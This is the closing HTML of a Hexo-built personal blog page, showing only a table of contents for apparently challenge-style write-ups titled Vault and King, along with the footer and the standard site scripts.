class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-7"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-5"><span class="toc-article-text">Solution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Vault"><span class="toc-article-text">Vault</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-8"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-8"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-8"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-6"><span class="toc-article-text">Solution</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#King"><span class="toc-article-text">King</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Description-9"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Code-9"><span class="toc-article-text">Code</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Memo-9"><span class="toc-article-text">Memo</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Solution-7"><span class="toc-article-text">Solution</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 n2ryx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
